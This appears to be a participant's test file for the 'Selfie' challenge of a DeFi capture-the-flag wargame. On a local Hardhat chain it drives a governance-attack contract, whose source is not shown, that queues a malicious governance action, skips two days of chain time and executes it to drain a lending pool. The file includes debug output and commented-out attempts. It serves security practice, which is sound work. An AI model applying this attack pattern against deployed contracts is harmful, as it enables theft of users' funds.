const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Selfie', function () {
    let deployer, attacker;

    const TOKEN_INITIAL_SUPPLY = ethers.utils.parseEther('2000000'); // 2 million tokens
    const TOKENS_IN_POOL = ethers.utils.parseEther('1500000'); // 1.5 million tokens
    
    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableTokenSnapshotFactory = await ethers.getContractFactory('DamnValuableTokenSnapshot', deployer);
        const SimpleGovernanceFactory = await ethers.getContractFactory('SimpleGovernance', deployer);
        const SelfiePoolFactory = await ethers.getContractFactory('SelfiePool', deployer);

        this.token = await DamnValuableTokenSnapshotFactory.deploy(TOKEN_INITIAL_SUPPLY);
        this.governance = await SimpleGovernanceFactory.deploy(this.token.address);
        this.pool = await SelfiePoolFactory.deploy(
            this.token.address,
            this.governance.address    
        );

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal(TOKENS_IN_POOL);
    });

    it('Exploit', async function () {
        /** CODE YOUR EXPLOIT HERE */
//	await this.token.transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
//	await this.token.transfer(attacker.address,TOKENS_IN_POOL);
        console.log(attacker.addres);
	console.log(this.token.balanceOf(attacker.address));
	const forceFactory = await ethers.getContractFactory('ForceSendEther', deployer);
        this.forceEther = await forceFactory.deploy();
        //await deployer.sendTransaction({to: this.forceEther.address, value: ethers.utils.parseEther("100.0"), });

        const attackPoolFactory = await ethers.getContractFactory('GovernanceAttack', deployer);
        this.poolAttack = await attackPoolFactory.deploy(this.governance.address,this.pool.address,this.token.address,attacker.address,this.forceEther.address);
//        await ethers.provider.transfer(this.poolAttack, ethers.utils.parseEther('1') ); 
        //await ethers.provider.call({to: this.poolAttack.address,value:  ethers.utils.parseEther('1')  });
        //await deployer.sendTransaction({to: this.poolAttack.address, value: ethers.utils.parseEther("1.0"), });
	console.log(this.governance.address);
	console.log("before queue");
        await this.poolAttack.attackQueue();
	console.log("after queue");
	console.log("before attack");
        //pass two days 3600 * 24 * 2
        await network.provider.send("evm_increaseTime", [172801] );
	/*
	let elapsedTime = 2;
	while(elapsedTime > 0){
		await ethers.provider.send("evm_increaseTime", [2 * 24 * 3600]);
		await ethers.provider.send("evm_mine");
		elapsedTime--; 
	}*/

        await this.poolAttack.attackExecute();
	console.log("after attack");

    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.equal(TOKENS_IN_POOL);        
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.be.equal('0');
    });
});
